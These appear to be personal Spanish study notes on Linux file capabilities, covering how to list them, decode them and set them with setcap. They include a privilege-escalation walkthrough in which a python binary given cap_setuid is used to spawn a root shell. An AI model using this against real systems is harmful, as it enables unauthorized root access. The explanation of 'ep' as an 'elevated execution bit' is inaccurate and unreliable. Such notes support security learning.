Listar capatibilities

ls /proc/

ls /proc/9/status
cat /proc/9/status | grep Cap

capsh --decode=00000034433ff  (nos decodea las capabilities)

vamos a setear una capabilitie a tcpdump
setcap cap_net_raw,cap_net_admin=eip /usr/bin/tcpdump
Esto hace que a nivel de cualquier usuario se puede ejecutar el binario (no es suid ni sudoer)

ahora estamos como usuario ken(normal)
vamos a listar las capabilities
getcap -r / 2>/dev/null

ahora vemos con
ps -faux te da un pid tcpdump 
hacemos un cat /proc/480/status | grep Cap
ahora ya viendo las capabillities hacemos un 
capsh --decode=(la capabilitie(su hash))
nos lista las capabilities tal que asi


hay una utilidad llamada getpcaps y le pasamos el PID y nos da la lectura de capabilities

Capabilities que mas suponen riesgo son las cap_setuid+ep (por ejemplo se pueden usar con python)

Para asignar una capabilitie a puython es 
setcap cap_setuid+ep /usr/bin/python3.10

ahora supongamos que estamos desde usuario ken(norml)

hacemos una busqueda con getcap
getcap -r / 2>/dev/null
utilizamos getcap /usr/bin/python3.10
asi que con python hacemos lo siguiente

python3.10 -c 'import os; os.setuid(0); os.system("bash)'
y nos da una shell

para retirar la capabilitie lo podemos hacer de la siguiente manera

setcap -r /usr/bin/python3.10


Capabilities hay muchas y podemos apoyarnos con gtfobins y podemos filtrar por capabilities
- si un proceso tiene la capability “**CAP_NET_ADMIN**” y la capability “**CAP_SETUID**” configurada como permitida, entonces el proceso puede modificar la configuración de red y cambiar su **UID** (**User ID**).


Para **listar** las capabilities de un archivo binario en Linux, puedes usar el comando **getcap**. Este comando muestra las capabilities efectivas, heredables y permitidas del archivo. Por ejemplo, para ver las capabilities del archivo binario **/usr/bin/ping**, puedes ejecutar el siguiente comando en la terminal:

➜ `getcap /usr/bin/ping`

La salida del comando mostrará las capabilities asignadas al archivo:

➜ `/usr/bin/ping = cap_net_admin,cap_net_raw+ep`

En este caso, el binario ping tiene dos capabilities asignadas: **cap_net_admin** y **cap_net_raw+ep**. La última capability (**cap_net_raw+ep**) indica que el archivo tiene el bit de ejecución elevado (**ep**) y la capability **cap_net_raw** asignada.

Para **asignar** una capability a un archivo binario, puedes utilizar el comando **setcap**. Este comando establece las capabilities efectivas, heredables y permitidas para el archivo especificado.

Por ejemplo, para otorgar la capability **cap_net_admin** al archivo binario **/usr/bin/my_program**, puedes ejecutar el siguiente comando en la terminal:

➜ `sudo setcap cap_net_admin+ep /usr/bin/my_program`

En este caso, el comando otorga la capability **cap_net_admin** al archivo **/usr/bin/my_program**, y también establece el bit de ejecución elevado (**ep**). Ahora, el archivo my_program tendrá permisos para administrar la configuración de red.

El **bit de ejecución elevado** (en inglés, elevated execution bit o “**ep**“) es un atributo especial que se puede establecer en un archivo binario en Linux. Este atributo se utiliza en conjunción con las capabilities para permitir que un archivo se ejecute con permisos especiales, incluso si el usuario que lo ejecuta no tiene privilegios de superusuario.


-----------------
------------

Para ver enlaces simbolicos hacemos ls -l
asi:
![[Pasted image 20250420231000.png]]
